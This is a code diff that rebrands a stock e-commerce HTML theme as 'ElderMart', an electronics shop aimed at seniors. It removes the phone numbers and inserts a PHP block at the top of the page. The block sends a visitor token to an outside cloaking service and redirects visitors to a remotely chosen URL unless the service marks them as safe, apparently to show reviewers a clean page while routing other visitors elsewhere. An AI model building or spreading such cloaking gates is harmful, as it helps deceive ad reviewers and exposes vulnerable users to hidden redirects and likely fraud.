@@ -1,3 +1,15 @@
+
+
+<?php
+$tk = $_GET['tk'];$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL,"https://app.cloakerly.com/v2/verifyToken");
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS,"cid=24442&tk=$tk");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$r = curl_exec($ch); $d = json_decode($r, true); curl_close ($ch);
+if($d !== false)if(!$d['ss']==true)exit(header(sprintf("Location: %s", $d['s']))); ?>
+
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -6,15 +18,15 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <title>BEST ELECTRONIC DEALS</title>
-A    <!-- Favicon -->
+    <!-- Favicon -->
     <link rel="apple-touch-icon" sizes="180x180" href="assets/images/icons/apple-touch-icon.png">
     <link rel="icon" type="image/png" sizes="32x32" href="assets/images/icons/favicon-32x32.png">
     <link rel="icon" type="image/png" sizes="16x16" href="assets/images/icons/favicon-16x16.png">
     <link rel="manifest" href="assets/images/icons/site.webmanifest">
     <link rel="mask-icon" href="assets/images/icons/safari-pinned-tab.svg" color="#666666">
     <link rel="shortcut icon" href="assets/images/icons/favicon.ico">
-    <meta name="apple-mobile-web-app-title" content="Molla">
-    <meta name="application-name" content="Molla">
+    <meta name="apple-mobile-web-app-title" content="ElderMart">
+    <meta name="application-name" content="ElderMart">
     <meta name="msapplication-TileColor" content="#cc9966">
     <meta name="msapplication-config" content="assets/images/icons/browserconfig.xml">
     <meta name="theme-color" content="#ffffff">
@@ -36,7 +48,7 @@ A    <!-- Favicon -->
             <div class="header-top">
                 <div class="container">
                     <div class="header-left">
-                        <a href="tel:#"><i class="icon-phone"></i>Call: 1-864-000-1212</a>
+                        <a href="tel:#"><i class="icon-phone"></i></a>
                     </div><!-- End .header-left -->
 
                     <div class="header-right">
@@ -86,7 +98,7 @@ A    <!-- Favicon -->
                         </button>
 
                         <a href="index.html" class="logo">
-                            <img src="assets/images/demos/demo-4/logo.png" alt="Molla Logo" width="105" height="25">
+                            <img src="assets/images/demos/demo-4/logo.png" alt="ElderMart Logo" width="105" height="25">
                         </a>
                     </div><!-- End .header-left -->
 
@@ -3047,12 +3059,12 @@ A    <!-- Favicon -->
 	            		<div class="col-sm-6 col-lg-3">
 	            			<div class="widget widget-about">
 	            				<img src="assets/images/demos/demo-4/logo-footer.png" class="footer-logo" alt="Footer Logo" width="105" height="25">
-	            				<p>Praesent dapibus, neque id cursus ucibus, tortor neque egestas augue, eu vulputate magna eros eu erat. </p>
+	            				<p>Welcome to our electronic ecommerce platform tailored for elders. With user friendly interface and specially curated products, we prioritize simplicity and accessibility. Our mission is to empower seniors with modern technology, offering a wide range of electronics designed to enhance their daily lives with ease and comfort.  </p>
 
 	            				<div class="widget-call">
                                     <i class="icon-phone"></i>
                                     Got Question? Call us 24/7
-                                    <a href="tel:#">+0123 456 789</a>
+                                    <a href="tel:#"></a>
                                 </div><!-- End .widget-call -->
 	            			</div><!-- End .widget about-widget -->
 	            		</div><!-- End .col-sm-6 col-lg-3 -->
@@ -3062,9 +3074,9 @@ A    <!-- Favicon -->
 	            				<h4 class="widget-title">Useful Links</h4><!-- End .widget-title -->
 
 	            				<ul class="widget-list">
-	            					<li><a href="about.html">About Molla</a></li>
+	            					<li><a href="about.html">About ElderMart</a></li>
                                     <li><a href="#">Our Services</a></li>
-	            					<li><a href="#">How to shop on Molla</a></li>
+	            					<li><a href="#">How to shop on ElderMart</a></li>
 	            					<li><a href="faq.html">FAQ</a></li>
 	            					<li><a href="contact.html">Contact us</a></li>
 	            				</ul><!-- End .widget-list -->
@@ -3105,7 +3117,7 @@ A    <!-- Favicon -->
 
 	        <div class="footer-bottom">
 	        	<div class="container">
-	        		<p class="footer-copyright">Copyright © 2024 Molla Store. All Rights Reserved.</p><!-- End .footer-copyright -->
+	        		<p class="footer-copyright">Copyright © 2024 ElderMart Store. All Rights Reserved.</p><!-- End .footer-copyright -->
 	        		<figure class="footer-payments">
 	        			<img src="assets/images/payments.png" alt="Payment methods" width="272" height="20">
 	        		</figure><!-- End .footer-payments -->
